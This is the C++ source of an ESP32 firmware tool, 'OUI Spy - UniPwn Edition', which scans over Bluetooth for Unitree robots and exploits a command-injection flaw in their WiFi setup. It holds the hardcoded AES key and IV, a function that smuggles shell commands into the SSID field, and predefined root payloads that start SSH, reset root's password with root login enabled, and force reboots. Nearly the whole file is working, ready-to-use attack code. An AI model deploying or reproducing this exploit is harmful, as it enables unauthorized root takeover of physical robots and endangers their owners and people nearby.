/*
 * ESP32-S3 Unitree Robot BLE Exploit Tool
 * Based on UniPwn research by Bin4ry and h0stile
 * 
 * This tool exploits the BLE WiFi configuration vulnerability
 * in Unitree robots (Go2, G1, H1, B2 series)
 */

#include "config.h"
// Use built-in ESP32 BLE stack for better compatibility
#include "BLEDevice.h"
#include "BLEClient.h"
#include "BLEScan.h"
#include "BLEAdvertisedDevice.h"
#include "BLERemoteCharacteristic.h"
#include <WiFi.h>
#include <SPIFFS.h>
#include <ArduinoJson.h>
#include <mbedtls/aes.h>
#include <Preferences.h>
#include <vector>
#include <map>
#include <algorithm>

// UUIDs from original Python code
#define DEVICE_NAME_UUID        "00002a00-0000-1000-8000-00805f9b34fb"
#define CUSTOM_CHAR_UUID        "0000ffe1-0000-1000-8000-00805f9b34fb"
#define CUSTOM_CHAR_UUID_2      "0000ffe2-0000-1000-8000-00805f9b34fb"
#define UNITREE_SERVICE_UUID    "0000ffe0-0000-1000-8000-00805f9b34fb"

// Configuration
#define SCAN_TIME_SECONDS 30
// CHUNK_SIZE is now defined in config.h
#define MAX_RECENT_DEVICES 5

// Continuous scanning variables
bool continuousScanning = false;
unsigned long lastScanTime = 0;
const unsigned long CONTINUOUS_SCAN_INTERVAL = 1500; // 1.5 seconds between scans

// Hardcoded AES parameters (from reverse engineering)
const uint8_t AES_KEY[16] = {
    0xdf, 0x98, 0xb7, 0x15, 0xd5, 0xc6, 0xed, 0x2b,
    0x25, 0x81, 0x7b, 0x6f, 0x25, 0x54, 0x12, 0x4a
};

const uint8_t AES_IV[16] = {
    0x28, 0x41, 0xae, 0x97, 0x41, 0x9c, 0x29, 0x73,
    0x29, 0x6a, 0x0d, 0x4b, 0xdf, 0xe1, 0x9a, 0x4f
};

const String HANDSHAKE_CONTENT = "unitree";
const String COUNTRY_CODE = "US";

// External declarations for web interface variables
#if ENABLE_WEB_INTERFACE
extern String serialLogBuffer;
#endif

// Predefined commands
struct Command {
    String name;
    String cmd;
    String description;
};

std::vector<Command> predefinedCmds = {
    {"enable_ssh", "/etc/init.d/ssh start", "Enable SSH access"},
    {"change_root_pwd", "echo 'root:Bin4ryWasHere'|chpasswd;sed -i 's/^#*\\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config;", "Change root password"},
    {"get_serial", "cat /sys/class/dmi/id/product_serial", "Get robot serial number"},
    {"reboot", "reboot -f", "Reboot the robot"},
    {"get_info", "cat /etc/os-release && uname -a", "Get system information"}
};

// Device structure
struct UnitreeDevice {
    String address;
    String name;
    int rssi;
    unsigned long lastSeen;
    String uuid;  // New field for service UUID
};

// Global variables
std::vector<UnitreeDevice> discoveredDevices;
std::vector<UnitreeDevice> recentDevices;
BLEClient* pClient = nullptr;
BLERemoteCharacteristic* pWriteChar = nullptr;
BLERemoteCharacteristic* pNotifyChar = nullptr;
bool deviceConnected = false;
bool verbose = true;
std::vector<uint8_t> receivedNotification;
bool notificationReceived = false;
std::map<uint8_t, std::vector<uint8_t>> serialChunks;

// Hardware feedback runtime toggles
bool buzzerEnabled = true;
bool ledEnabled = true;
Preferences preferences;

// Function declarations
void styledPrint(const String& message, bool verboseOnly = false);
void debugPrint(const String& message, const String& category = "DEBUG");
void infoPrint(const String& message);
void warningPrint(const String& message);
void errorPrint(const String& message);
void successPrint(const String& message);
String buildPwn(const String& cmd);
std::vector<uint8_t> encryptData(const std::vector<uint8_t>& data);
std::vector<uint8_t> decryptData(const std::vector<uint8_t>& data);
std::vector<uint8_t> createPacket(uint8_t instruction, const std::vector<uint8_t>& dataBytes = {});
bool genericResponseValidator(const std::vector<uint8_t>& response, uint8_t expectedInstruction);
void scanForDevices();
void startContinuousScanning();
void stopContinuousScanning();
void performSingleScan();
void displayMenu();
void handleMenuChoice(int choice);
bool connectToDevice(const UnitreeDevice& device);
void exploitDevice(const String& ssid, const String& password);
void loadRecentDevices();
void saveRecentDevices();
void addRecentDevice(const UnitreeDevice& device);
void saveConfiguration();
void loadConfiguration();

// Hardware feedback function declarations
#if ENABLE_BUZZER || ENABLE_LED_FEEDBACK
void initializeHardwareFeedback();
void feedbackExploitSuccess();
void feedbackExploitFailed();
void feedbackTargetFound();
void feedbackScanning();
void feedbackConnecting();
void handleProximityFeedback(int rssi);
void stopAllFeedback();
void toggleBuzzer();
void toggleLED();
void botDetectionBeeps();
void feedbackBotDetection();
#endif
bool executeCommand(const UnitreeDevice& device, const String& command);
bool exploitSequence(const String& ssid, const String& password);

void setup() {
    Serial.begin(115200);
    while (!Serial) delay(10);
    
    // Initialize SPIFFS for device history
    if (!SPIFFS.begin(true)) {
        styledPrint("[-] SPIFFS initialization failed");
    }
    
    // Load recent devices and configuration
    loadRecentDevices();
    loadConfiguration();
    
    // Initialize BLE
    BLEDevice::init("ESP32-UniPwn");
    
    // Ensure BLE scanning is stopped at boot
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->stop();
    pBLEScan->clearResults();
    
    // Display banner with red background for pentesting theme
    Serial.println("\n\033[41;1;37m");  // Red background, bold white text
    Serial.println("+=======================================+");
    Serial.println("|   OUI Spy - UniPwn Edition           |");
    Serial.println("| Unitree Robot BLE Exploit Platform   |");
    Serial.println("| Go2, G1, H1, B2 Series Support       |");
    Serial.println("+=======================================+");
    Serial.println("\033[0m\033[1;31m");  // Reset background, keep red text
    Serial.println("  Based on: github.com/Bin4ry/UniPwn");
    Serial.println("  Research by Bin4ry & h0stile - 2025");
    Serial.println("\033[0m");
    
    // Initialize hardware feedback system
#if ENABLE_BUZZER || ENABLE_LED_FEEDBACK
    initializeHardwareFeedback();
    // Single beep at boot
    bootBeep();
#endif
    
#if ENABLE_WEB_INTERFACE
    setupWebInterface();
#endif
    
    displayMenu();
}

void loop() {
#if ENABLE_WEB_INTERFACE
    handleWebInterface();
#endif
    
    // Handle continuous scanning
    if (continuousScanning) {
        unsigned long currentTime = millis();
        if (currentTime - lastScanTime >= CONTINUOUS_SCAN_INTERVAL) {
            infoPrint("Continuous scan cycle - searching for Unitree devices...");
            performSingleScan();
            lastScanTime = currentTime;
            
            // Print current device count
            if (discoveredDevices.size() > 0) {
                infoPrint("Found " + String(discoveredDevices.size()) + " Unitree device(s) so far");
            }
        }
    }
    
    if (Serial.available()) {
        int choice = Serial.parseInt();
        if (choice > 0) {
            handleMenuChoice(choice);
            displayMenu();
        }
    }
    delay(10);
}

void styledPrint(const String& message, bool verboseOnly) {
    if (verboseOnly && !verbose) return;
    Serial.print("\033[1;32m[//]\033[0m ");
    Serial.println(message);
    
    #if ENABLE_WEB_INTERFACE
    // Mirror to web operations log
    extern void mirrorSerialToWeb(const String& message);
    String fullMessage = "[//] " + message;
    mirrorSerialToWeb(fullMessage);
    #endif
}

void debugPrint(const String& message, const String& category) {
    if (!verbose) return;
    Serial.print("\033[1;36m[" + category + "]\033[0m ");
    Serial.println(message);
    
    #if ENABLE_WEB_INTERFACE
    extern void mirrorSerialToWeb(const String& message);
    String fullMessage = "[" + category + "] " + message;
    mirrorSerialToWeb(fullMessage);
    #endif
}

void infoPrint(const String& message) {
    Serial.print("\033[1;34m[INFO]\033[0m ");
    Serial.println(message);
    
    #if ENABLE_WEB_INTERFACE
    extern void mirrorSerialToWeb(const String& message);
    String fullMessage = "[INFO] " + message;
    mirrorSerialToWeb(fullMessage);
    #endif
}

void warningPrint(const String& message) {
    Serial.print("\033[1;33m[WARN]\033[0m ");
    Serial.println(message);
    
    #if ENABLE_WEB_INTERFACE
    extern void mirrorSerialToWeb(const String& message);
    String fullMessage = "[WARN] " + message;
    mirrorSerialToWeb(fullMessage);
    #endif
}

void errorPrint(const String& message) {
    Serial.print("\033[1;31m[ERROR]\033[0m ");
    Serial.println(message);
    
    #if ENABLE_WEB_INTERFACE
    extern void mirrorSerialToWeb(const String& message);
    String fullMessage = "[ERROR] " + message;
    mirrorSerialToWeb(fullMessage);
    #endif
}

void successPrint(const String& message) {
    Serial.print("\033[1;32m[SUCCESS]\033[0m ");
    Serial.println(message);
    
    #if ENABLE_WEB_INTERFACE
    extern void mirrorSerialToWeb(const String& message);
    String fullMessage = "[SUCCESS] " + message;
    mirrorSerialToWeb(fullMessage);
    #endif
}

String buildPwn(const String& cmd) {
    return "\";$(" + cmd + ");#";
}

std::vector<uint8_t> encryptData(const std::vector<uint8_t>& data) {
    std::vector<uint8_t> encrypted(data.size());
    mbedtls_aes_context aes_ctx;
    size_t offset = 0;
    uint8_t iv_copy[16];
    
    // Copy IV since it gets modified
    memcpy(iv_copy, AES_IV, 16);
    
    mbedtls_aes_init(&aes_ctx);
    mbedtls_aes_setkey_enc(&aes_ctx, AES_KEY, 128);
    mbedtls_aes_crypt_cfb128(&aes_ctx, MBEDTLS_AES_ENCRYPT, data.size(), 
                             &offset, iv_copy, data.data(), encrypted.data());
    mbedtls_aes_free(&aes_ctx);
    
    return encrypted;
}

std::vector<uint8_t> decryptData(const std::vector<uint8_t>& data) {
    std::vector<uint8_t> decrypted(data.size());
    mbedtls_aes_context aes_ctx;
    size_t offset = 0;
    uint8_t iv_copy[16];
    
    // Copy IV since it gets modified
    memcpy(iv_copy, AES_IV, 16);
    
    mbedtls_aes_init(&aes_ctx);
    mbedtls_aes_setkey_enc(&aes_ctx, AES_KEY, 128);
    mbedtls_aes_crypt_cfb128(&aes_ctx, MBEDTLS_AES_DECRYPT, data.size(), 
                             &offset, iv_copy, data.data(), decrypted.data());
    mbedtls_aes_free(&aes_ctx);
    
    return decrypted;
}

std::vector<uint8_t> createPacket(uint8_t instruction, const std::vector<uint8_t>& dataBytes) {
    std::vector<uint8_t> instructionData = {instruction};
    instructionData.insert(instructionData.end(), dataBytes.begin(), dataBytes.end());
    
    uint8_t length = instructionData.size() + 3;
    std::vector<uint8_t> fullData = {0x52, length};
    fullData.insert(fullData.end(), instructionData.begin(), instructionData.end());
    
    // Calculate checksum
    uint8_t checksum = 0;
    for (uint8_t b : fullData) {
        checksum += b;
    }
    checksum = (~checksum + 1) & 0xFF; // Two's complement
    
    fullData.push_back(checksum);
    return encryptData(fullData);
}

bool genericResponseValidator(const std::vector<uint8_t>& response, uint8_t expectedInstruction) {
    if (response.size() < 5) {
        errorPrint("Response packet too short");
        return false;
    }
    
    if (response[0] != 0x51) {
        errorPrint("Invalid opcode in response");
        return false;
    }
    
    if (response.size() != response[1]) {
        errorPrint("Packet length mismatch");
        return false;
    }
    
    if (response[2] != expectedInstruction) {
        errorPrint("Instruction mismatch: Expected " + String(expectedInstruction) + 
                   ", Got " + String(response[2]));
        return false;
    }
    
    // Verify checksum
    uint8_t expectedChecksum = 0;
    for (size_t i = 0; i < response.size() - 1; i++) {
        expectedChecksum += response[i];
    }
    expectedChecksum = (~expectedChecksum + 1) & 0xFF;
    
    if (response[response.size() - 1] != expectedChecksum) {
        errorPrint("Checksum validation failed");
        return false;
    }
    
    return response[3] == 0x01;
}

void displayMenu() {
    Serial.println("\n\033[41;1;37m=== OUI Spy UniPwn Menu ===\033[0m");
    Serial.println("1. Use web app to start scanning");
    Serial.println("2. Show recent targets");
    Serial.println("3. Connect and exploit target");
    Serial.println("4. Toggle verbose mode (current: " + String(verbose ? "ON" : "OFF") + ")");
    Serial.println("5. Show attack vectors");
    Serial.println("6. System information");
#if ENABLE_WEB_INTERFACE
    Serial.println("7. Web interface info");
#endif
#if ENABLE_BUZZER
    Serial.println("8. Toggle buzzer feedback (current: " + String(buzzerEnabled ? "ON" : "OFF") + ")");
#endif
#if ENABLE_LED_FEEDBACK
    Serial.println("9. Toggle LED feedback (current: " + String(ledEnabled ? "ON" : "OFF") + ")");
#endif
    Serial.print("\n\033[1;31m[//] Enter choice: \033[0m");
}

void handleMenuChoice(int choice) {
    switch (choice) {
        case 1:
            infoPrint("Scanning disabled from serial. Use web app at http://192.168.4.1");
            break;
        case 2:
            showRecentDevices();
            break;
        case 3:
            selectAndExploitDevice();
            break;
        case 4:
            verbose = !verbose;
            infoPrint("Verbose mode " + String(verbose ? "enabled" : "disabled"));
            break;
        case 5:
            showPredefinedCommands();
            break;
        case 6:
            showSystemInfo();
            break;
#if ENABLE_WEB_INTERFACE
        case 7:
            showWebInterfaceInfo();
            break;
#endif
#if ENABLE_BUZZER
        case 8:
            toggleBuzzer();
            break;
#endif
#if ENABLE_LED_FEEDBACK
        case 9:
            toggleLED();
            break;
#endif
        default:
            errorPrint("Invalid menu choice");
            break;
    }
}

// BLE Scan callback
class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) {
        String deviceName = advertisedDevice.getName().c_str();
        String deviceAddress = advertisedDevice.getAddress().toString().c_str();
        int rssi = advertisedDevice.getRSSI();
        
        // Show ALL BLE devices in operations log (not just verbose mode)
        if (deviceName.length() > 0) {
            infoPrint("BLE DEVICE: " + deviceName + " (" + deviceAddress + ") RSSI: " + String(rssi) + " dBm");
        } else {
            // Show unnamed devices too
            infoPrint("BLE DEVICE: [UNNAMED] (" + deviceAddress + ") RSSI: " + String(rssi) + " dBm");
        }
        
        // Check if it's a Unitree device
        if (deviceName.startsWith("G1_") || deviceName.startsWith("Go2_") || 
            deviceName.startsWith("B2_") || deviceName.startsWith("H1_") || 
            deviceName.startsWith("X1_")) {
            
            // IMMEDIATE detection print - this happens instantly!
            successPrint("*** UNITREE TARGET DETECTED ***: " + deviceName + " (" + deviceAddress + ") RSSI: " + String(rssi) + " dBm");
            
#if ENABLE_WEB_INTERFACE
            // IMMEDIATE web UI update - don't wait for full processing!
            String immediateLog = "TARGET FOUND: " + deviceName + " (" + deviceAddress + ") RSSI: " + String(rssi) + " dBm<br>";
            serialLogBuffer += immediateLog;
            
            // IMMEDIATE UI population - add device to list instantly for UI polling
            UnitreeDevice immediateDevice;
            immediateDevice.address = deviceAddress;
            immediateDevice.name = deviceName;
            immediateDevice.rssi = rssi;
            immediateDevice.lastSeen = millis();
            immediateDevice.uuid = "PROCESSING..."; // Will be updated later
            
            // Check if already in list (avoid duplicates)
            bool alreadyExists = false;
            for (auto& d : discoveredDevices) {
                if (d.address == deviceAddress) {
                    // Update existing entry
                    d.rssi = rssi;
                    d.lastSeen = millis();
                    d.name = deviceName;
                    alreadyExists = true;
                    break;
                }
            }
            
            if (!alreadyExists) {
                // Add immediately so UI polls can see it right away
                discoveredDevices.push_back(immediateDevice);
            }
#endif
            
            UnitreeDevice device;
            device.address = advertisedDevice.getAddress().toString().c_str();
            device.name = deviceName;
            device.rssi = advertisedDevice.getRSSI();
            device.lastSeen = millis();
            // Capture all available UUIDs from BLE advertisement
            String allUUIDs = "";
            
            // Method 1: Primary service UUID
            if (advertisedDevice.haveServiceUUID()) {
                allUUIDs = advertisedDevice.getServiceUUID().toString().c_str();
            }
            
            // Method 2: Service data UUIDs
            if (advertisedDevice.getServiceDataCount() > 0) {
                for (int i = 0; i < advertisedDevice.getServiceDataCount(); i++) {
                    String serviceUUID = advertisedDevice.getServiceDataUUID(i).toString().c_str();
                    if (allUUIDs.length() == 0) {
                        allUUIDs = serviceUUID;
                    } else if (allUUIDs.indexOf(serviceUUID) == -1) {  // Avoid duplicates
                        allUUIDs += ", " + serviceUUID;
                    }
                }
            }
            
            // Method 3: Try to get payload length info (getPayload returns uint8_t*)
            size_t payloadLength = advertisedDevice.getPayloadLength();
            if (payloadLength > 0 && allUUIDs.length() == 0) {
                allUUIDs = "RAW_DATA_" + String(payloadLength) + "_BYTES";
            }
            
            if (allUUIDs.length() == 0) {
                allUUIDs = "NO_SERVICES";
            }
            
            device.uuid = allUUIDs;
            
            // Update existing entry with complete UUID info (device was already added immediately above)
            bool found = false;
            for (auto& d : discoveredDevices) {
                if (d.address == device.address) {
                    d.rssi = device.rssi;  // Update RSSI
                    d.lastSeen = device.lastSeen;
                    d.name = deviceName;  // Update name in case it changed
                    d.uuid = device.uuid;  // Update UUID from "PROCESSING..." to actual UUID
                    found = true;
                    break;
                }
            }
            
            if (!found) {
                // This should rarely happen since we add immediately above
                discoveredDevices.push_back(device);
            }
            
            // Log UUID information (clean, no spam)
            infoPrint("Unitree UUID: " + device.uuid);
            
            // Only do feedback and notification for truly new devices
            if (!found) {
                // Bot detection feedback - 3 fast beeps and LED pattern
#if ENABLE_BUZZER || ENABLE_LED_FEEDBACK
                feedbackBotDetection();
#endif

                // IMMEDIATE web interface update when robot is detected
#if ENABLE_WEB_INTERFACE
                notifyWebInterfaceNewTarget(device);
#endif
            } else {
                // Skip serial print for updates to avoid "double detection" feel
                // styledPrint("Updated: " + deviceName + " (" + device.address + ") RSSI: " + String(device.rssi));
                
                // Heartbeat beeps for device still around (but not too frequently)
                static unsigned long lastHeartbeatTime = 0;
                if (millis() - lastHeartbeatTime > 5000) {  // Every 5 seconds max
#if ENABLE_BUZZER
                    heartbeatBeeps();
#endif
                    lastHeartbeatTime = millis();
                }
            }
        }
    }
};

void startContinuousScanning() {
    infoPrint("Starting CONTINUOUS BLE scan for Unitree devices...");
    infoPrint("Scan will continue until stopped via web interface");
    continuousScanning = true;
    discoveredDevices.clear();
    lastScanTime = 0; // Force immediate first scan
    
#if ENABLE_BUZZER
    scanningBeeps();
#endif
}

void stopContinuousScanning() {
    infoPrint("Stopping continuous BLE scan...");
    continuousScanning = false;
    
    // Stop any active scan
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->stop();
    pBLEScan->clearResults();
    
    successPrint("Continuous scanning stopped. Found " + String(discoveredDevices.size()) + " total Unitree target(s)");
}

void performSingleScan() {
    if (!continuousScanning) return; // Safety check
    
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
    
    // Very short scan for continuous mode - 1 second
    BLEScanResults* foundDevices = pBLEScan->start(1, false);
    pBLEScan->clearResults();
}

void scanForDevices() {
    // Legacy single scan for compatibility
    infoPrint("Starting BLE scan for Unitree devices...");
    discoveredDevices.clear();
    
#if ENABLE_BUZZER
    scanningBeeps();
#endif
    
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
    
    BLEScanResults* foundDevices = pBLEScan->start(SCAN_TIME_SECONDS, false);
    pBLEScan->clearResults();
    
    if (discoveredDevices.size() > 0) {
        successPrint("Scan complete. Found " + String(discoveredDevices.size()) + " Unitree target(s)");
        
        // Summary of discovered devices
        for (int i = 0; i < discoveredDevices.size(); i++) {
            infoPrint("Target " + String(i + 1) + ": " + discoveredDevices[i].name + " (" + discoveredDevices[i].address + ") RSSI: " + String(discoveredDevices[i].rssi) + " dBm");
        }
    } else {
        warningPrint("Scan complete. No Unitree devices found in range");
    }
}

void showRecentDevices() {
    if (recentDevices.empty()) {
        styledPrint("No recent devices found");
        return;
    }
    
    styledPrint("Recent devices:");
    for (size_t i = 0; i < recentDevices.size(); i++) {
        Serial.println("  " + String(i + 1) + ". " + recentDevices[i].name + 
                      " (" + recentDevices[i].address + ")");
    }
}

void showPredefinedCommands() {
    styledPrint("Available predefined commands:");
    for (size_t i = 0; i < predefinedCmds.size(); i++) {
        Serial.println("  " + String(i + 1) + ". " + predefinedCmds[i].name + 
                      " - " + predefinedCmds[i].description);
    }
}

void showSystemInfo() {
    styledPrint("OUI Spy UniPwn System Information:");
    Serial.println("  Chip model: " + String(ESP.getChipModel()));
    Serial.println("  Chip revision: " + String(ESP.getChipRevision()));
    Serial.println("  Flash size: " + String(ESP.getFlashChipSize() / 1024 / 1024) + " MB");
    Serial.println("  Free heap: " + String(ESP.getFreeHeap() / 1024) + " KB");
    Serial.println("  Free PSRAM: " + String(ESP.getFreePsram() / 1024) + " KB");
    Serial.println("  MAC address: " + WiFi.macAddress());
    Serial.println("  Uptime: " + String(millis() / 1000 / 60) + " minutes");
#if ENABLE_WEB_INTERFACE
    Serial.println("  Web interface: ENABLED");
    Serial.println("  Access URL: http://192.168.4.1");
#else
    Serial.println("  Web interface: DISABLED");
#endif
}

#if ENABLE_WEB_INTERFACE
void showWebInterfaceInfo() {
    styledPrint("OUI Spy Web Interface Information:");
    Serial.println("  Status: ACTIVE");
    Serial.println("  SSID: " + String(WIFI_AP_SSID) + WiFi.macAddress().substring(9));
    Serial.println("  Password: " + String(WIFI_AP_PASSWORD));
    Serial.println("  URL: http://192.168.4.1");
    Serial.println("  Features: Professional UI, Real-time scanning,");
    Serial.println("           Attack automation, Target management");
    styledPrint("Connect any device to the WiFi and browse to the URL");
}
#endif

// Storage functions for recent devices
void loadRecentDevices() {
    if (!SPIFFS.exists("/recent_devices.json")) return;
    
    File file = SPIFFS.open("/recent_devices.json", "r");
    if (!file) return;
    
    DynamicJsonDocument doc(2048);
    deserializeJson(doc, file);
    file.close();
    
    JsonArray devices = doc["devices"];
    for (JsonObject device : devices) {
        UnitreeDevice d;
        d.address = device["address"].as<String>();
        d.name = device["name"].as<String>();
        d.lastSeen = device["lastSeen"];
        recentDevices.push_back(d);
    }
}

void saveRecentDevices() {
    DynamicJsonDocument doc(2048);
    JsonArray devices = doc.createNestedArray("devices");
    
    for (const auto& device : recentDevices) {
        JsonObject d = devices.createNestedObject();
        d["address"] = device.address;
        d["name"] = device.name;
        d["lastSeen"] = device.lastSeen;
    }
    
    File file = SPIFFS.open("/recent_devices.json", "w");
    if (file) {
        serializeJson(doc, file);
        file.close();
    }
}

void addRecentDevice(const UnitreeDevice& device) {
    // Remove if already exists
    recentDevices.erase(
        std::remove_if(recentDevices.begin(), recentDevices.end(),
                      [&](const UnitreeDevice& d) { return d.address == device.address; }),
        recentDevices.end());
    
    // Add to front
    recentDevices.insert(recentDevices.begin(), device);
    
    // Keep only last 5
    if (recentDevices.size() > MAX_RECENT_DEVICES) {
        recentDevices.resize(MAX_RECENT_DEVICES);
    }
    
    saveRecentDevices();
}

bool executeCommand(const UnitreeDevice& device, const String& command) {
    Serial.println("[EXPLOIT] Executing command on " + device.address + ": " + command);
    
    if (!connectToDevice(device)) {
        Serial.println("[EXPLOIT] Failed to connect to device");
        return false;
    }
    
    // Build the exploit payload with the command (per UniPwn research, inject via SSID)
    String ssid = buildPwn(command);  // Command injection payload for SSID
    String password = "testpassword";  // Normal password
    
    // Execute the exploit via validated step-by-step sequence
    bool success = exploitSequence(ssid, password);
    
    // Disconnect
    if (pClient && pClient->isConnected()) {
        pClient->disconnect();
    }
    
    Serial.println(String(success ? "[EXPLOIT] Command execution completed" : "[EXPLOIT] Command execution failed"));
    return success;
}

// Configuration storage functions
void saveConfiguration() {
    preferences.begin("unipwn", false);
    preferences.putBool("buzzerEnabled", buzzerEnabled);
    preferences.putBool("ledEnabled", ledEnabled);
    preferences.end();
    styledPrint("Configuration saved");
}

void loadConfiguration() {
    preferences.begin("unipwn", true);
    buzzerEnabled = preferences.getBool("buzzerEnabled", true);
    ledEnabled = preferences.getBool("ledEnabled", true);
    preferences.end();
    
    styledPrint("Buzzer: " + String(buzzerEnabled ? "ON" : "OFF") + 
               ", LED: " + String(ledEnabled ? "ON" : "OFF"));
}

// selectAndExploitDevice() is implemented in exploitation.ino
